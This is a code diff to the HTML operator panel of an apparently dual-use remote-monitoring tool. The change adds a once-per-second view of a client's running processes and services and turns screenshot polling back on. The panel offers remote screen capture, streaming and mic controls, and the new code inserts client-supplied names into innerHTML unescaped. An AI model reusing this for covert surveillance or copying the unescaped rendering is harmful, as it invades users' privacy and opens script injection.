@@ -37,6 +37,9 @@
       <button onclick="sendCommand('stop')">Stop Streaming</button>
       <button onclick="sendCommand('screenshot')">Take Screenshot</button>
       <button onclick="sendCommand('metrics')">Get Metrics</button>
+      <button onclick="sendCommand('list_apps_services')">
+        Просмотр приложений и служб
+      </button>
       <button onclick="sendCommand('vpn_create')">Create VPN connection</button>
       <!-- <button onclick="sendCommand('mic_start')">Start Mic</button>
       <button onclick="sendCommand('mic_stop')">Stop Mic</button> -->
@@ -76,6 +79,12 @@
 
     <h2>Метрики</h2>
     <div id="metrics">Загрузка метрик...</div>
+
+    <h2>Запущенные приложения</h2>
+    <div id="apps">Загрузка...</div>
+
+    <h2>Запущенные службы</h2>
+    <div id="services">Загрузка...</div>
 
     <script>
       var clientId = "{{.}}";
@@ -117,7 +126,6 @@
         ).src = `../uploads/latest_audio.wav?t=${Date.now()}`;
       }
       function updateMetrics() {
-        debugger;
         fetch("/clientmetrics?client=" + clientId)
           .then((response) => response.json())
           .then((data) => {
@@ -149,6 +157,45 @@
             console.error("Ошибка получения метрик:", error);
             document.getElementById("metrics").innerText =
               "Ошибка получения метрик";
+          });
+      }
+
+      function updateAppsServices() {
+        fetch("/clientappsdata?client=" + clientId)
+          .then((response) => response.json())
+          .then((data) => {
+            let processHtml = "";
+            if (data.processes && data.processes.length > 0) {
+              processHtml +=
+                "<table border='1' cellpadding='5'><tr><th>PID</th><th>Название</th></tr>";
+              data.processes.forEach((proc) => {
+                processHtml += `<tr><td>${proc.pid}</td><td>${proc.name}</td></tr>`;
+              });
+              processHtml += "</table>";
+            } else {
+              processHtml = "Нет запущенных приложений.";
+            }
+            document.getElementById("apps").innerHTML = processHtml;
+
+            let servicesHtml = "";
+            if (data.services && data.services.length > 0) {
+              servicesHtml +=
+                "<table border='1' cellpadding='5'><tr><th>Имя</th><th>Отображаемое имя</th><th>Статус</th></tr>";
+              data.services.forEach((svc) => {
+                servicesHtml += `<tr><td>${svc.name}</td><td>${svc.display_name}</td><td>${svc.status}</td></tr>`;
+              });
+              servicesHtml += "</table>";
+            } else {
+              servicesHtml = "Нет запущенных служб.";
+            }
+            document.getElementById("services").innerHTML = servicesHtml;
+          })
+          .catch((error) => {
+            console.error("Ошибка получения данных:", error);
+            document.getElementById("apps").innerText =
+              "Ошибка получения данных";
+            document.getElementById("services").innerText =
+              "Ошибка получения данных";
           });
       }
 
@@ -188,18 +235,20 @@
       }
 
       setInterval(() => {
-        // updateTime();
-        // updateImage();
-        // updateScreenshot();
+        updateTime();
+        updateImage();
+        updateScreenshot();
         updateMetrics();
         // updateMic();
+        updateAppsServices();
       }, 1000);
 
       updateTime();
-      // updateImage();
-      // updateScreenshot();
+      updateImage();
+      updateScreenshot();
       updateMetrics();
       // updateMic();
+      updateAppsServices();
     </script>
     <!-- <script>
       let audioCtx = null;
